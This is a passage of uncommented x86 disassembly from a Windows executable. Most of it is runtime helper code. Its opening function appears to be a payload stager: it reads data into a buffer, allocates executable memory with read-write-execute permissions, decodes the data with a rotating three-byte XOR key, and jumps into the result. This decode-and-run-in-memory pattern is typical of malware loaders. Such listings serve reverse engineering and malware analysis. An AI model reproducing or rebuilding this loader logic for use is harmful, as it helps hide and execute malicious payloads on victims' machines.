  402946:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  40294c:	51                   	push   %ecx
  40294d:	8b 55 90             	mov    -0x70(%ebp),%edx
  402950:	52                   	push   %edx
  402951:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  402957:	50                   	push   %eax
  402958:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  40295b:	51                   	push   %ecx
  40295c:	ff 15 20 54 40 00    	call   *0x405420
  402962:	89 45 94             	mov    %eax,-0x6c(%ebp)
  402965:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  402969:	75 02                	jne    0x40296d
  40296b:	eb 34                	jmp    0x4029a1
  40296d:	8b 95 18 ff ff ff    	mov    -0xe8(%ebp),%edx
  402973:	52                   	push   %edx
  402974:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  40297a:	50                   	push   %eax
  40297b:	8b 8d 1c ff ff ff    	mov    -0xe4(%ebp),%ecx
  402981:	03 4d a4             	add    -0x5c(%ebp),%ecx
  402984:	51                   	push   %ecx
  402985:	e8 d6 0e 00 00       	call   0x403860
  40298a:	83 c4 0c             	add    $0xc,%esp
  40298d:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  402990:	03 95 18 ff ff ff    	add    -0xe8(%ebp),%edx
  402996:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  402999:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40299c:	3b 45 a4             	cmp    -0x5c(%ebp),%eax
  40299f:	77 a5                	ja     0x402946
  4029a1:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4029a4:	51                   	push   %ecx
  4029a5:	ff 15 24 54 40 00    	call   *0x405424
  4029ab:	8b 95 0c ff ff ff    	mov    -0xf4(%ebp),%edx
  4029b1:	52                   	push   %edx
  4029b2:	ff 15 24 54 40 00    	call   *0x405424
  4029b8:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  4029be:	50                   	push   %eax
  4029bf:	ff 15 24 54 40 00    	call   *0x405424
  4029c5:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  4029c8:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  4029cb:	6a 40                	push   $0x40
  4029cd:	68 00 30 00 00       	push   $0x3000
  4029d2:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4029d5:	52                   	push   %edx
  4029d6:	6a 00                	push   $0x0
  4029d8:	ff 15 18 54 40 00    	call   *0x405418
  4029de:	89 45 9c             	mov    %eax,-0x64(%ebp)
  4029e1:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4029e5:	75 27                	jne    0x402a0e
  4029e7:	c7 85 64 fd ff ff 00 	movl   $0x0,-0x29c(%ebp)
  4029ee:	00 00 00 
  4029f1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4029f8:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  4029fe:	e8 bd ea ff ff       	call   0x4014c0
  402a03:	8b 85 64 fd ff ff    	mov    -0x29c(%ebp),%eax
  402a09:	e9 da 00 00 00       	jmp    0x402ae8
  402a0e:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  402a15:	eb 09                	jmp    0x402a20
  402a17:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402a1a:	83 c0 01             	add    $0x1,%eax
  402a1d:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402a20:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402a23:	3b 4d a8             	cmp    -0x58(%ebp),%ecx
  402a26:	0f 83 90 00 00 00    	jae    0x402abc
  402a2c:	8b 95 1c ff ff ff    	mov    -0xe4(%ebp),%edx
  402a32:	03 55 c0             	add    -0x40(%ebp),%edx
  402a35:	8a 02                	mov    (%edx),%al
  402a37:	88 85 7b fd ff ff    	mov    %al,-0x285(%ebp)
  402a3d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402a40:	33 d2                	xor    %edx,%edx
  402a42:	b9 03 00 00 00       	mov    $0x3,%ecx
  402a47:	f7 f1                	div    %ecx
  402a49:	85 d2                	test   %edx,%edx
  402a4b:	75 12                	jne    0x402a5f
  402a4d:	0f b6 95 7b fd ff ff 	movzbl -0x285(%ebp),%edx
  402a54:	83 f2 57             	xor    $0x57,%edx
  402a57:	88 95 7b fd ff ff    	mov    %dl,-0x285(%ebp)
  402a5d:	eb 4a                	jmp    0x402aa9
  402a5f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402a62:	33 d2                	xor    %edx,%edx
  402a64:	b9 03 00 00 00       	mov    $0x3,%ecx
  402a69:	f7 f1                	div    %ecx
  402a6b:	83 fa 01             	cmp    $0x1,%edx
  402a6e:	75 12                	jne    0x402a82
  402a70:	0f b6 95 7b fd ff ff 	movzbl -0x285(%ebp),%edx
  402a77:	83 f2 77             	xor    $0x77,%edx
  402a7a:	88 95 7b fd ff ff    	mov    %dl,-0x285(%ebp)
  402a80:	eb 27                	jmp    0x402aa9
  402a82:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402a85:	33 d2                	xor    %edx,%edx
  402a87:	b9 03 00 00 00       	mov    $0x3,%ecx
  402a8c:	f7 f1                	div    %ecx
  402a8e:	83 fa 02             	cmp    $0x2,%edx
  402a91:	75 16                	jne    0x402aa9
  402a93:	0f b6 95 7b fd ff ff 	movzbl -0x285(%ebp),%edx
  402a9a:	83 f2 36             	xor    $0x36,%edx
  402a9d:	0f b6 45 c0          	movzbl -0x40(%ebp),%eax
  402aa1:	33 d0                	xor    %eax,%edx
  402aa3:	88 95 7b fd ff ff    	mov    %dl,-0x285(%ebp)
  402aa9:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  402aac:	03 4d c0             	add    -0x40(%ebp),%ecx
  402aaf:	8a 95 7b fd ff ff    	mov    -0x285(%ebp),%dl
  402ab5:	88 11                	mov    %dl,(%ecx)
  402ab7:	e9 5b ff ff ff       	jmp    0x402a17
  402abc:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  402ac2:	50                   	push   %eax
  402ac3:	ff 55 9c             	call   *-0x64(%ebp)
  402ac6:	c7 85 60 fd ff ff 00 	movl   $0x0,-0x2a0(%ebp)
  402acd:	00 00 00 
  402ad0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402ad7:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  402add:	e8 de e9 ff ff       	call   0x4014c0
  402ae2:	8b 85 60 fd ff ff    	mov    -0x2a0(%ebp),%eax
  402ae8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402aeb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402af2:	59                   	pop    %ecx
  402af3:	5f                   	pop    %edi
  402af4:	5e                   	pop    %esi
  402af5:	5b                   	pop    %ebx
  402af6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402af9:	33 cd                	xor    %ebp,%ecx
  402afb:	e8 c2 03 00 00       	call   0x402ec2
  402b00:	8b e5                	mov    %ebp,%esp
  402b02:	5d                   	pop    %ebp
  402b03:	c2 10 00             	ret    $0x10
  402b06:	cc                   	int3
  402b07:	cc                   	int3
  402b08:	cc                   	int3
  402b09:	cc                   	int3
  402b0a:	cc                   	int3
  402b0b:	cc                   	int3
  402b0c:	cc                   	int3
  402b0d:	cc                   	int3
  402b0e:	cc                   	int3
  402b0f:	cc                   	int3
  402b10:	8b ff                	mov    %edi,%edi
  402b12:	56                   	push   %esi
  402b13:	8b f1                	mov    %ecx,%esi
  402b15:	8b 06                	mov    (%esi),%eax
  402b17:	85 c0                	test   %eax,%eax
  402b19:	74 0a                	je     0x402b25
  402b1b:	50                   	push   %eax
  402b1c:	e8 19 07 00 00       	call   0x40323a
  402b21:	83 26 00             	andl   $0x0,(%esi)
  402b24:	59                   	pop    %ecx
  402b25:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402b29:	83 66 08 00          	andl   $0x0,0x8(%esi)
  402b2d:	5e                   	pop    %esi
  402b2e:	c3                   	ret
  402b2f:	8b ff                	mov    %edi,%edi
  402b31:	56                   	push   %esi
  402b32:	6a 18                	push   $0x18
  402b34:	8b f1                	mov    %ecx,%esi
  402b36:	6a 00                	push   $0x0
  402b38:	56                   	push   %esi
  402b39:	e8 02 07 00 00       	call   0x403240
  402b3e:	83 c4 0c             	add    $0xc,%esp
  402b41:	8b c6                	mov    %esi,%eax
  402b43:	5e                   	pop    %esi
  402b44:	c3                   	ret
  402b45:	6a 0c                	push   $0xc
  402b47:	68 48 45 40 00       	push   $0x404548
  402b4c:	e8 f7 06 00 00       	call   0x403248
  402b51:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402b55:	51                   	push   %ecx
  402b56:	ff 15 84 40 40 00    	call   *0x404084
  402b5c:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  402b60:	eb 1e                	jmp    0x402b80
  402b62:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402b65:	8b 00                	mov    (%eax),%eax
  402b67:	8b 00                	mov    (%eax),%eax
  402b69:	33 c9                	xor    %ecx,%ecx
  402b6b:	3d 17 00 00 c0       	cmp    $0xc0000017,%eax
  402b70:	0f 94 c1             	sete   %cl
  402b73:	8b c1                	mov    %ecx,%eax
  402b75:	c3                   	ret
  402b76:	8b 65 e8             	mov    -0x18(%ebp),%esp
  402b79:	c7 45 e4 0e 00 07 80 	movl   $0x8007000e,-0x1c(%ebp)
  402b80:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402b87:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b8a:	e8 fe 06 00 00       	call   0x40328d
  402b8f:	c3                   	ret
  402b90:	8b ff                	mov    %edi,%edi
  402b92:	55                   	push   %ebp
  402b93:	8b ec                	mov    %esp,%ebp
  402b95:	8b 45 08             	mov    0x8(%ebp),%eax
  402b98:	85 c0                	test   %eax,%eax
  402b9a:	7c 0e                	jl     0x402baa
  402b9c:	3b 41 04             	cmp    0x4(%ecx),%eax
  402b9f:	7d 09                	jge    0x402baa
  402ba1:	8b 09                	mov    (%ecx),%ecx
  402ba3:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  402ba6:	5d                   	pop    %ebp
  402ba7:	c2 04 00             	ret    $0x4
  402baa:	6a 00                	push   $0x0
  402bac:	6a 00                	push   $0x0
  402bae:	6a 01                	push   $0x1
  402bb0:	68 8c 00 00 c0       	push   $0xc000008c
  402bb5:	ff 15 94 40 40 00    	call   *0x404094
  402bbb:	cc                   	int3
  402bbc:	8b ff                	mov    %edi,%edi
  402bbe:	56                   	push   %esi
  402bbf:	8b f1                	mov    %ecx,%esi
  402bc1:	8d 4e 14             	lea    0x14(%esi),%ecx
  402bc4:	e8 66 ff ff ff       	call   0x402b2f
  402bc9:	33 c0                	xor    %eax,%eax
  402bcb:	89 46 2c             	mov    %eax,0x2c(%esi)
  402bce:	89 46 30             	mov    %eax,0x30(%esi)
  402bd1:	89 46 34             	mov    %eax,0x34(%esi)
  402bd4:	8b c6                	mov    %esi,%eax
  402bd6:	5e                   	pop    %esi
  402bd7:	c3                   	ret
  402bd8:	8b ff                	mov    %edi,%edi
  402bda:	56                   	push   %esi
  402bdb:	8b f1                	mov    %ecx,%esi
  402bdd:	8d 46 14             	lea    0x14(%esi),%eax
  402be0:	50                   	push   %eax
  402be1:	ff 15 80 40 40 00    	call   *0x404080
  402be7:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  402bea:	5e                   	pop    %esi
  402beb:	e9 20 ff ff ff       	jmp    0x402b10
  402bf0:	8b ff                	mov    %edi,%edi
  402bf2:	55                   	push   %ebp
  402bf3:	8b ec                	mov    %esp,%ebp
  402bf5:	56                   	push   %esi
  402bf6:	57                   	push   %edi
  402bf7:	8b f1                	mov    %ecx,%esi
  402bf9:	8d 7e 14             	lea    0x14(%esi),%edi
  402bfc:	57                   	push   %edi
  402bfd:	ff 15 8c 40 40 00    	call   *0x40408c
  402c03:	8b 46 30             	mov    0x30(%esi),%eax
  402c06:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402c09:	3b c8                	cmp    %eax,%ecx
  402c0b:	7f 23                	jg     0x402c30
  402c0d:	85 c9                	test   %ecx,%ecx
  402c0f:	7c 1f                	jl     0x402c30
  402c11:	3b c8                	cmp    %eax,%ecx
  402c13:	75 0e                	jne    0x402c23
  402c15:	8b 76 08             	mov    0x8(%esi),%esi
  402c18:	57                   	push   %edi
  402c19:	ff 15 88 40 40 00    	call   *0x404088
  402c1f:	8b c6                	mov    %esi,%eax
  402c21:	eb 16                	jmp    0x402c39
  402c23:	51                   	push   %ecx
  402c24:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  402c27:	e8 64 ff ff ff       	call   0x402b90
  402c2c:	8b 30                	mov    (%eax),%esi
  402c2e:	eb e8                	jmp    0x402c18
  402c30:	57                   	push   %edi
  402c31:	ff 15 88 40 40 00    	call   *0x404088
  402c37:	33 c0                	xor    %eax,%eax
  402c39:	5f                   	pop    %edi
  402c3a:	5e                   	pop    %esi
  402c3b:	5d                   	pop    %ebp
  402c3c:	c2 04 00             	ret    $0x4
  402c3f:	8b ff                	mov    %edi,%edi
  402c41:	56                   	push   %esi
  402c42:	8b f1                	mov    %ecx,%esi
  402c44:	e8 73 ff ff ff       	call   0x402bbc
  402c49:	b8 00 00 40 00       	mov    $0x400000,%eax
  402c4e:	8d 4e 14             	lea    0x14(%esi),%ecx
  402c51:	c7 06 38 00 00 00    	movl   $0x38,(%esi)
  402c57:	89 46 08             	mov    %eax,0x8(%esi)
  402c5a:	89 46 04             	mov    %eax,0x4(%esi)
  402c5d:	c7 46 0c 00 09 00 00 	movl   $0x900,0xc(%esi)
  402c64:	c7 46 10 9c 41 40 00 	movl   $0x40419c,0x10(%esi)
  402c6b:	e8 d5 fe ff ff       	call   0x402b45
  402c70:	85 c0                	test   %eax,%eax
  402c72:	7d 07                	jge    0x402c7b
  402c74:	c6 05 04 54 40 00 01 	movb   $0x1,0x405404
  402c7b:	8b c6                	mov    %esi,%eax
  402c7d:	5e                   	pop    %esi
  402c7e:	c3                   	ret
  402c7f:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  402c83:	c7 01 ac 41 40 00    	movl   $0x4041ac,(%ecx)
  402c89:	74 0e                	je     0x402c99
  402c8b:	8b 49 04             	mov    0x4(%ecx),%ecx
  402c8e:	85 c9                	test   %ecx,%ecx
  402c90:	74 07                	je     0x402c99
  402c92:	51                   	push   %ecx
  402c93:	ff 15 7c 40 40 00    	call   *0x40407c
  402c99:	c3                   	ret
  402c9a:	8b ff                	mov    %edi,%edi
  402c9c:	55                   	push   %ebp
  402c9d:	8b ec                	mov    %esp,%ebp
  402c9f:	ff 75 08             	push   0x8(%ebp)
  402ca2:	6a 00                	push   $0x0
  402ca4:	ff 71 04             	push   0x4(%ecx)
  402ca7:	ff 15 78 40 40 00    	call   *0x404078
  402cad:	5d                   	pop    %ebp
  402cae:	c2 04 00             	ret    $0x4
  402cb1:	8b ff                	mov    %edi,%edi
  402cb3:	55                   	push   %ebp
  402cb4:	8b ec                	mov    %esp,%ebp
  402cb6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402cba:	74 0e                	je     0x402cca
  402cbc:	ff 75 08             	push   0x8(%ebp)
  402cbf:	6a 00                	push   $0x0
  402cc1:	ff 71 04             	push   0x4(%ecx)
  402cc4:	ff 15 74 40 40 00    	call   *0x404074
  402cca:	5d                   	pop    %ebp
  402ccb:	c2 04 00             	ret    $0x4
  402cce:	8b ff                	mov    %edi,%edi
  402cd0:	55                   	push   %ebp
  402cd1:	8b ec                	mov    %esp,%ebp
  402cd3:	33 c0                	xor    %eax,%eax
  402cd5:	39 45 08             	cmp    %eax,0x8(%ebp)
  402cd8:	75 09                	jne    0x402ce3
  402cda:	ff 75 0c             	push   0xc(%ebp)
  402cdd:	8b 01                	mov    (%ecx),%eax
  402cdf:	ff 10                	call   *(%eax)
  402ce1:	eb 21                	jmp    0x402d04
  402ce3:	39 45 0c             	cmp    %eax,0xc(%ebp)
  402ce6:	75 0c                	jne    0x402cf4
  402ce8:	ff 75 08             	push   0x8(%ebp)
  402ceb:	8b 01                	mov    (%ecx),%eax
  402ced:	ff 50 04             	call   *0x4(%eax)
  402cf0:	33 c0                	xor    %eax,%eax
  402cf2:	eb 10                	jmp    0x402d04
  402cf4:	ff 75 0c             	push   0xc(%ebp)
  402cf7:	ff 75 08             	push   0x8(%ebp)
  402cfa:	50                   	push   %eax
  402cfb:	ff 71 04             	push   0x4(%ecx)
  402cfe:	ff 15 70 40 40 00    	call   *0x404070
  402d04:	5d                   	pop    %ebp
  402d05:	c2 08 00             	ret    $0x8
  402d08:	8b ff                	mov    %edi,%edi
  402d0a:	55                   	push   %ebp
  402d0b:	8b ec                	mov    %esp,%ebp
  402d0d:	ff 75 08             	push   0x8(%ebp)
  402d10:	6a 00                	push   $0x0
  402d12:	ff 71 04             	push   0x4(%ecx)
  402d15:	ff 15 6c 40 40 00    	call   *0x40406c
  402d1b:	5d                   	pop    %ebp
  402d1c:	c2 04 00             	ret    $0x4
  402d1f:	8b ff                	mov    %edi,%edi
  402d21:	55                   	push   %ebp
  402d22:	8b ec                	mov    %esp,%ebp
  402d24:	56                   	push   %esi
  402d25:	8b f1                	mov    %ecx,%esi
  402d27:	e8 53 ff ff ff       	call   0x402c7f
  402d2c:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402d30:	74 07                	je     0x402d39
  402d32:	56                   	push   %esi
  402d33:	e8 84 01 00 00       	call   0x402ebc
  402d38:	59                   	pop    %ecx
  402d39:	8b c6                	mov    %esi,%eax
  402d3b:	5e                   	pop    %esi
  402d3c:	5d                   	pop    %ebp
  402d3d:	c2 04 00             	ret    $0x4
  402d40:	8b ff                	mov    %edi,%edi
  402d42:	55                   	push   %ebp
  402d43:	8b ec                	mov    %esp,%ebp
  402d45:	8b c1                	mov    %ecx,%eax
  402d47:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402d4a:	89 48 04             	mov    %ecx,0x4(%eax)
  402d4d:	c7 00 c0 41 40 00    	movl   $0x4041c0,(%eax)
  402d53:	33 c9                	xor    %ecx,%ecx
  402d55:	c7 40 14 02 00 00 00 	movl   $0x2,0x14(%eax)
  402d5c:	89 48 0c             	mov    %ecx,0xc(%eax)
  402d5f:	89 48 10             	mov    %ecx,0x10(%eax)
  402d62:	66 89 48 18          	mov    %cx,0x18(%eax)
  402d66:	66 89 48 1a          	mov    %cx,0x1a(%eax)
  402d6a:	89 40 08             	mov    %eax,0x8(%eax)
  402d6d:	5d                   	pop    %ebp
  402d6e:	c2 04 00             	ret    $0x4
  402d71:	8b ff                	mov    %edi,%edi
  402d73:	55                   	push   %ebp
  402d74:	8b ec                	mov    %esp,%ebp
  402d76:	8b 45 0c             	mov    0xc(%ebp),%eax
  402d79:	f7 65 10             	mull   0x10(%ebp)
  402d7c:	85 d2                	test   %edx,%edx
  402d7e:	77 05                	ja     0x402d85
  402d80:	83 f8 ff             	cmp    $0xffffffff,%eax
  402d83:	76 07                	jbe    0x402d8c
  402d85:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402d8a:	5d                   	pop    %ebp
  402d8b:	c3                   	ret
  402d8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402d8f:	89 01                	mov    %eax,(%ecx)
  402d91:	33 c0                	xor    %eax,%eax
  402d93:	5d                   	pop    %ebp
  402d94:	c3                   	ret
  402d95:	8b ff                	mov    %edi,%edi
  402d97:	55                   	push   %ebp
  402d98:	8b ec                	mov    %esp,%ebp
  402d9a:	8b 49 04             	mov    0x4(%ecx),%ecx
  402d9d:	8b 01                	mov    (%ecx),%eax
  402d9f:	5d                   	pop    %ebp
  402da0:	ff 60 04             	jmp    *0x4(%eax)
  402da3:	33 d2                	xor    %edx,%edx
  402da5:	8d 41 14             	lea    0x14(%ecx),%eax
  402da8:	42                   	inc    %edx
  402da9:	f0 0f c1 10          	lock xadd %edx,(%eax)
  402dad:	8d 41 08             	lea    0x8(%ecx),%eax
  402db0:	c3                   	ret
  402db1:	8b c1                	mov    %ecx,%eax
  402db3:	c3                   	ret
  402db4:	8b ff                	mov    %edi,%edi
  402db6:	55                   	push   %ebp
  402db7:	8b ec                	mov    %esp,%ebp
  402db9:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402dbd:	56                   	push   %esi
  402dbe:	8b f1                	mov    %ecx,%esi
  402dc0:	c7 06 c0 41 40 00    	movl   $0x4041c0,(%esi)
  402dc6:	74 07                	je     0x402dcf
  402dc8:	56                   	push   %esi
  402dc9:	e8 ee 00 00 00       	call   0x402ebc
  402dce:	59                   	pop    %ecx
  402dcf:	8b c6                	mov    %esi,%eax
  402dd1:	5e                   	pop    %esi
  402dd2:	5d                   	pop    %ebp
  402dd3:	c2 04 00             	ret    $0x4
  402dd6:	8b ff                	mov    %edi,%edi
  402dd8:	55                   	push   %ebp
  402dd9:	8b ec                	mov    %esp,%ebp
  402ddb:	8b 45 0c             	mov    0xc(%ebp),%eax
  402dde:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402de1:	83 ca ff             	or     $0xffffffff,%edx
  402de4:	2b d0                	sub    %eax,%edx
  402de6:	3b d1                	cmp    %ecx,%edx
  402de8:	73 07                	jae    0x402df1
  402dea:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402def:	5d                   	pop    %ebp
  402df0:	c3                   	ret
  402df1:	03 c1                	add    %ecx,%eax
  402df3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402df6:	89 01                	mov    %eax,(%ecx)
  402df8:	33 c0                	xor    %eax,%eax
  402dfa:	5d                   	pop    %ebp
  402dfb:	c3                   	ret
  402dfc:	8b ff                	mov    %edi,%edi
  402dfe:	55                   	push   %ebp
  402dff:	8b ec                	mov    %esp,%ebp
  402e01:	56                   	push   %esi
  402e02:	8b 75 08             	mov    0x8(%ebp),%esi
  402e05:	57                   	push   %edi
  402e06:	ff 75 0c             	push   0xc(%ebp)
  402e09:	83 c6 08             	add    $0x8,%esi
  402e0c:	83 e6 f8             	and    $0xfffffff8,%esi
  402e0f:	8d 45 08             	lea    0x8(%ebp),%eax
  402e12:	56                   	push   %esi
  402e13:	50                   	push   %eax
  402e14:	8b f9                	mov    %ecx,%edi
  402e16:	e8 56 ff ff ff       	call   0x402d71
  402e1b:	83 c4 0c             	add    $0xc,%esp
  402e1e:	85 c0                	test   %eax,%eax
  402e20:	7c 36                	jl     0x402e58
  402e22:	ff 75 08             	push   0x8(%ebp)
  402e25:	8d 45 08             	lea    0x8(%ebp),%eax
  402e28:	6a 10                	push   $0x10
  402e2a:	50                   	push   %eax
  402e2b:	e8 a6 ff ff ff       	call   0x402dd6
  402e30:	83 c4 0c             	add    $0xc,%esp
  402e33:	85 c0                	test   %eax,%eax
  402e35:	7c 21                	jl     0x402e58
  402e37:	8b 4f 04             	mov    0x4(%edi),%ecx
  402e3a:	ff 75 08             	push   0x8(%ebp)
  402e3d:	8b 01                	mov    (%ecx),%eax
  402e3f:	ff 10                	call   *(%eax)
  402e41:	85 c0                	test   %eax,%eax
  402e43:	74 13                	je     0x402e58
  402e45:	4e                   	dec    %esi
  402e46:	83 60 04 00          	andl   $0x0,0x4(%eax)
  402e4a:	89 38                	mov    %edi,(%eax)
  402e4c:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  402e53:	89 70 08             	mov    %esi,0x8(%eax)
  402e56:	eb 02                	jmp    0x402e5a
  402e58:	33 c0                	xor    %eax,%eax
  402e5a:	5f                   	pop    %edi
  402e5b:	5e                   	pop    %esi
  402e5c:	5d                   	pop    %ebp
  402e5d:	c2 08 00             	ret    $0x8
  402e60:	8b ff                	mov    %edi,%edi
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	56                   	push   %esi
  402e66:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e69:	57                   	push   %edi
  402e6a:	ff 75 10             	push   0x10(%ebp)
  402e6d:	83 c6 08             	add    $0x8,%esi
  402e70:	83 e6 f8             	and    $0xfffffff8,%esi
  402e73:	8d 45 0c             	lea    0xc(%ebp),%eax
  402e76:	56                   	push   %esi
  402e77:	50                   	push   %eax
  402e78:	8b f9                	mov    %ecx,%edi
  402e7a:	e8 f2 fe ff ff       	call   0x402d71
  402e7f:	83 c4 0c             	add    $0xc,%esp
  402e82:	85 c0                	test   %eax,%eax
  402e84:	7c 2d                	jl     0x402eb3
  402e86:	ff 75 0c             	push   0xc(%ebp)
  402e89:	8d 45 0c             	lea    0xc(%ebp),%eax
  402e8c:	6a 10                	push   $0x10
  402e8e:	50                   	push   %eax
  402e8f:	e8 42 ff ff ff       	call   0x402dd6
  402e94:	83 c4 0c             	add    $0xc,%esp
  402e97:	85 c0                	test   %eax,%eax
  402e99:	7c 18                	jl     0x402eb3
  402e9b:	ff 75 0c             	push   0xc(%ebp)
  402e9e:	8b 4f 04             	mov    0x4(%edi),%ecx
  402ea1:	ff 75 08             	push   0x8(%ebp)
  402ea4:	8b 01                	mov    (%ecx),%eax
  402ea6:	ff 50 08             	call   *0x8(%eax)
  402ea9:	85 c0                	test   %eax,%eax
  402eab:	74 06                	je     0x402eb3
  402ead:	4e                   	dec    %esi
  402eae:	89 70 08             	mov    %esi,0x8(%eax)
  402eb1:	eb 02                	jmp    0x402eb5
  402eb3:	33 c0                	xor    %eax,%eax
  402eb5:	5f                   	pop    %edi
  402eb6:	5e                   	pop    %esi
  402eb7:	5d                   	pop    %ebp
  402eb8:	c2 0c 00             	ret    $0xc
  402ebb:	cc                   	int3
  402ebc:	ff 25 24 41 40 00    	jmp    *0x404124
  402ec2:	3b 0d 18 50 40 00    	cmp    0x405018,%ecx
  402ec8:	75 02                	jne    0x402ecc
  402eca:	f3 c3                	repz ret
  402ecc:	e9 b1 04 00 00       	jmp    0x403382
  402ed1:	8b ff                	mov    %edi,%edi
  402ed3:	55                   	push   %ebp
  402ed4:	8b ec                	mov    %esp,%ebp
  402ed6:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402eda:	57                   	push   %edi
  402edb:	8b f9                	mov    %ecx,%edi
  402edd:	74 25                	je     0x402f04
  402edf:	56                   	push   %esi
  402ee0:	68 42 38 40 00       	push   $0x403842
  402ee5:	8d 77 fc             	lea    -0x4(%edi),%esi
  402ee8:	ff 36                	push   (%esi)
  402eea:	6a 0c                	push   $0xc
  402eec:	57                   	push   %edi
  402eed:	e8 f4 05 00 00       	call   0x4034e6
  402ef2:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402ef6:	74 07                	je     0x402eff
  402ef8:	56                   	push   %esi
  402ef9:	e8 be ff ff ff       	call   0x402ebc
  402efe:	59                   	pop    %ecx
  402eff:	8b c6                	mov    %esi,%eax
  402f01:	5e                   	pop    %esi
  402f02:	eb 14                	jmp    0x402f18
  402f04:	e8 39 09 00 00       	call   0x403842
  402f09:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402f0d:	74 07                	je     0x402f16
  402f0f:	57                   	push   %edi
  402f10:	e8 a7 ff ff ff       	call   0x402ebc
  402f15:	59                   	pop    %ecx
  402f16:	8b c7                	mov    %edi,%eax
  402f18:	5f                   	pop    %edi
  402f19:	5d                   	pop    %ebp
  402f1a:	c2 04 00             	ret    $0x4
  402f1d:	cc                   	int3
  402f1e:	ff 25 10 41 40 00    	jmp    *0x404110
  402f24:	68 c6 35 40 00       	push   $0x4035c6
  402f29:	e8 3d 04 00 00       	call   0x40336b
  402f2e:	a1 f8 53 40 00       	mov    0x4053f8,%eax
  402f33:	c7 04 24 c4 50 40 00 	movl   $0x4050c4,(%esp)
  402f3a:	ff 35 f4 53 40 00    	push   0x4053f4
  402f40:	a3 c4 50 40 00       	mov    %eax,0x4050c4
  402f45:	68 b4 50 40 00       	push   $0x4050b4
  402f4a:	68 b8 50 40 00       	push   $0x4050b8
  402f4f:	68 b0 50 40 00       	push   $0x4050b0
  402f54:	ff 15 00 41 40 00    	call   *0x404100
  402f5a:	83 c4 14             	add    $0x14,%esp
  402f5d:	a3 c0 50 40 00       	mov    %eax,0x4050c0
  402f62:	85 c0                	test   %eax,%eax
  402f64:	7d 08                	jge    0x402f6e
  402f66:	6a 08                	push   $0x8
  402f68:	e8 2d 06 00 00       	call   0x40359a
  402f6d:	59                   	pop    %ecx
  402f6e:	c3                   	ret
  402f6f:	6a 58                	push   $0x58
  402f71:	68 68 45 40 00       	push   $0x404568
  402f76:	e8 cd 02 00 00       	call   0x403248
  402f7b:	33 db                	xor    %ebx,%ebx
  402f7d:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  402f80:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402f83:	8d 45 98             	lea    -0x68(%ebp),%eax
  402f86:	50                   	push   %eax
  402f87:	ff 15 58 40 40 00    	call   *0x404058
  402f8d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402f94:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402f9b:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  402fa1:	8b 70 04             	mov    0x4(%eax),%esi
  402fa4:	bf 34 54 40 00       	mov    $0x405434,%edi
  402fa9:	6a 00                	push   $0x0
  402fab:	56                   	push   %esi
  402fac:	57                   	push   %edi
  402fad:	ff 15 5c 40 40 00    	call   *0x40405c
  402fb3:	85 c0                	test   %eax,%eax
  402fb5:	74 18                	je     0x402fcf
  402fb7:	3b c6                	cmp    %esi,%eax
  402fb9:	75 07                	jne    0x402fc2
  402fbb:	33 f6                	xor    %esi,%esi
  402fbd:	46                   	inc    %esi
